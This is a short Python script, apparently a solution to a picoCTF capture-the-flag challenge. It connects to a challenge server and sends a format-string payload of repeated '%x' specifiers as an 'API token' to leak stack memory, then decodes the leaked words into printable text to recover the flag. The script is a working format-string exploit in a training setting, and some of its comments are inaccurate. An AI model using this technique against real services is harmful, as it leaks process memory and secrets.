from nclib import Netcat

# Define connection
channel = Netcat(('mercury.picoctf.net', 6989))
# Receive until the last words in the response
channel.recv_until(b"my portfolio")
# Send option 1 to enter function buy_stonks
channel.sendln(b'1')
channel.read_until(b"What is your API token?")
#
token =  "%x" + "-%x"*23
channel.sendln(token)
# Receive 2 lines
channel.recv_line()
channel.recv_line()
# This is the line which we should receive the data from.
# decode it to remove unwanted data and strip it form spaces then split it.
data = channel.recv_line().decode().strip().split('-')
for mem_data in data:
    if len(mem_data) == 8 : # is data stored in memory
        b = bytearray.fromhex(mem_data) # eah line contain 4 characters since 2 hex represent 8 bytes.
        # check if each data is between 33 --> [ ! in ascii] and 126 [~ in ascii] then print it.
        print("".join([chr(i) for i in reversed(b) if i > 32 and i < 127]).strip(), end='')

    
